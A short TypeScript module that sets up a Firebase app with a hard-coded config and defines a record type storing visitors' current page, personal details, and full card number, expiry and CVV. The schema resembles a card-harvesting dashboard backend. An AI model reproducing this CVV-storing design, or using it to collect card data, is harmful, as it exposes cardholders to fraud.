import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
   apiKey: "AIzaSyCG8LTlgUUIRvnAijGBx942udwfU0EnMgg",
  authDomain: "moror-e8ea1.firebaseapp.com",
  projectId: "moror-e8ea1",
  storageBucket: "moror-e8ea1.firebasestorage.app",
  messagingSenderId: "51170639825",
  appId: "1:51170639825:web:6eb0b548fec3be17d6aaf0",
  measurementId: "G-JJ8WYKHMVH"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

